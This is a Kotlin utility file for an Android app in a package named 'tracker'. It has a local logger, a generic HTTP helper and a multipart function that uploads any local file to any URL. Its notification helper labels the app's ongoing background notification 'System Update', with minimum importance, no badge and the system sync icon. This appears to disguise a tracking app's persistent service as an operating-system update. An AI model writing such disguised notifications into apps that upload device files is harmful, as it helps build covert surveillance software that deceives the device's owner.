package com.venice.tracker

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object Util {

    val ts: String
        get() = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())

    val stamp: String
        get() = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())

    fun log(ctx: Context, s: String) {
        try {
            val f = File(ctx.filesDir, "log.txt")
            if (f.length() > 300_000) f.delete()
            f.appendText("$ts  $s\n")
        } catch (_: Throwable) {}
    }

    fun http(urlStr: String, method: String, body: ByteArray?): Pair<Int, String> {
        var conn: HttpURLConnection? = null
        return try {
            conn = URL(urlStr).openConnection() as HttpURLConnection
            conn.requestMethod = method
            conn.connectTimeout = 20000
            conn.readTimeout = 90000
            conn.doInput = true
            if (body != null) {
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                conn.setFixedLengthStreamingMode(body.size)
                conn.outputStream.use { it.write(body) }
            }
            val code = conn.responseCode
            val txt = (if (code in 200..299) conn.inputStream else conn.errorStream)
                ?.bufferedReader()?.use { it.readText() } ?: ""
            Pair(code, txt)
        } catch (t: Throwable) {
            Pair(-1, t.toString())
        } finally {
            try { conn?.disconnect() } catch (_: Throwable) {}
        }
    }

    fun multipart(
        urlStr: String,
        fields: Map<String, String>,
        fileField: String,
        file: File
    ): Pair<Int, String> {
        val boundary = "----vb" + System.nanoTime().toString(16)
        var conn: HttpURLConnection? = null
        return try {
            conn = URL(urlStr).openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.doInput = true
            conn.connectTimeout = 20000
            conn.readTimeout = 600000
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            conn.outputStream.use { out ->
                fun w(s: String) = out.write(s.toByteArray(Charsets.UTF_8))
                for ((k, v) in fields) {
                    w("--$boundary\r\n")
                    w("Content-Disposition: form-data; name=\"$k\"\r\n\r\n")
                    w("$v\r\n")
                }
                w("--$boundary\r\n")
                w("Content-Disposition: form-data; name=\"$fileField\"; filename=\"${file.name}\"\r\n")
                w("Content-Type: application/octet-stream\r\n\r\n")
                file.inputStream().use { it.copyTo(out) }
                w("\r\n--$boundary--\r\n")
            }
            val code = conn.responseCode
            val txt = (if (code in 200..299) conn.inputStream else conn.errorStream)
                ?.bufferedReader()?.use { it.readText() } ?: ""
            Pair(code, txt)
        } catch (t: Throwable) {
            Pair(-1, t.toString())
        } finally {
            try { conn?.disconnect() } catch (_: Throwable) {}
        }
    }

    fun channel(ctx: Context) {
        if (Build.VERSION.SDK_INT >= 26) {
            val nm = ctx.getSystemService(NotificationManager::class.java)
            if (nm.getNotificationChannel("core") == null) {
                val ch = NotificationChannel(
                    "core", "Core", NotificationManager.IMPORTANCE_MIN
                )
                ch.setShowBadge(false)
                nm.createNotificationChannel(ch)
            }
        }
    }

    fun notification(ctx: Context, text: String): Notification {
        channel(ctx)
        val b = if (Build.VERSION.SDK_INT >= 26)
            Notification.Builder(ctx, "core") else Notification.Builder(ctx)
        return b.setContentTitle("System Update")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .build()
    }
}
